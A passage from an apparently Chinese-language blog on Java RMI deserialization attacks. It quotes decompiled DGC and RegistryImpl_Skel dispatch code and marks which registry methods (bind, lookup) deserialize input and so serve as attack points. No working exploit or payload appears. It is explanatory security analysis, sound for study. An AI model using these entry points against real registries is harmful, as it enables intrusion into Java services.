</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">var6</span><span class="p">.</span><span class="na">clean</span><span class="p">(</span><span class="n">var39</span><span class="p">,</span><span class="w"> </span><span class="n">var40</span><span class="p">,</span><span class="w"> </span><span class="n">var41</span><span class="p">,</span><span class="w"> </span><span class="n">var42</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var2</span><span class="p">.</span><span class="na">getResultStream</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var35</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var35</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="n">1</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ObjID</span><span class="o">[]</span><span class="w"> </span><span class="n">var7</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">long</span><span class="w"> </span><span class="n">var8</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Lease</span><span class="w"> </span><span class="n">var10</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ObjID</span><span class="o">[]</span><span class="p">)</span><span class="n">var13</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var13</span><span class="p">.</span><span class="na">readLong</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Lease</span><span class="p">)</span><span class="n">var13</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var32</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var32</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var33</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var33</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var2</span><span class="p">.</span><span class="na">releaseInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Lease</span><span class="w"> </span><span class="n">var11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var6</span><span class="p">.</span><span class="na">dirty</span><span class="p">(</span><span class="n">var7</span><span class="p">,</span><span class="w"> </span><span class="n">var8</span><span class="p">,</span><span class="w"> </span><span class="n">var10</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">var12</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getResultStream</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var12</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">var11</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var31</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var31</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">default</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;invalid method number&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h2 id="4rmi的几种攻击方式">4、RMI的几种攻击方式<a hidden class="anchor" aria-hidden="true" href="#4rmi的几种攻击方式">#</a></h2>
<p><a href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</a></p>
<h3 id="41-攻击注册中心">4.1 攻击注册中心<a hidden class="anchor" aria-hidden="true" href="#41-攻击注册中心">#</a></h3>
<p>攻击点还是在 <!-- raw HTML omitted -->RegistryImpl_Skel 代码中的反序列化，<!-- raw HTML omitted --></p>
<p><!-- raw HTML omitted -->case 的对应关系如下：<!-- raw HTML omitted --></p>
<ul>
<li><!-- raw HTML omitted -->case0 &ndash; bind<!-- raw HTML omitted --></li>
</ul>
<div class="code-block-container" id="code-1769750397341093400" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397341093400">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397341093400" title="Toggle" aria-expanded="false" aria-controls="code-1769750397341093400" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397341093400-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">case</span><span class="w"> </span><span class="n">0</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">var100</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">Remote</span><span class="w"> </span><span class="n">var103</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var105</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var100</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">var105</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var103</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Remote</span><span class="p">)</span><span class="n">var105</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var94</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var94</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var95</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var95</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var2</span><span class="p">.</span><span class="na">releaseInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">var6</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="n">var100</span><span class="p">,</span><span class="w"> </span><span class="n">var103</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var2</span><span class="p">.</span><span class="na">getResultStream</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var93</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var93</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li><!-- raw HTML omitted -->case1 &ndash; list<!-- raw HTML omitted -->
<ul>
<li><!-- raw HTML omitted -->list 这里没有 readObject ，无法攻击<!-- raw HTML omitted --></li>
</ul>
</li>
</ul>
<div class="code-block-container" id="code-1769750397347743000" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397347743000">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397347743000" title="Toggle" aria-expanded="false" aria-controls="code-1769750397347743000" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397347743000-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">case</span><span class="w"> </span><span class="n">1</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">var2</span><span class="p">.</span><span class="na">releaseInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">var99</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var6</span><span class="p">.</span><span class="na">list</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">var102</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getResultStream</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var102</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">var99</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var92</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var92</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li><!-- raw HTML omitted -->case2 &ndash; lookup<!-- raw HTML omitted --></li>
</ul>
<div class="code-block-container" id="code-1769750397350196400" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397350196400">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397350196400" title="Toggle" aria-expanded="false" aria-controls="code-1769750397350196400" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397350196400-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">case</span><span class="w"> </span><span class="n">2</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">var98</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var104</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var98</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">var104</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var89</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var89</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var90</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var90</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var2</span><span class="p">.</span><span class="na">releaseInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">Remote</span><span class="w"> </span><span class="n">var101</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var6</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="n">var98</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">var9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getResultStream</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var9</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">var101</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var88</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var88</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><ul>
<li><!-- raw HTML omitted -->case3 &ndash;  rebind<!-- raw HTML omitted --></li>
</ul>
<div class="code-block-container" id="code-1769750397354497700" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397354497700">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397354497700" title="Toggle" aria-expanded="false" aria-controls="code-1769750397354497700" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397354497700-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
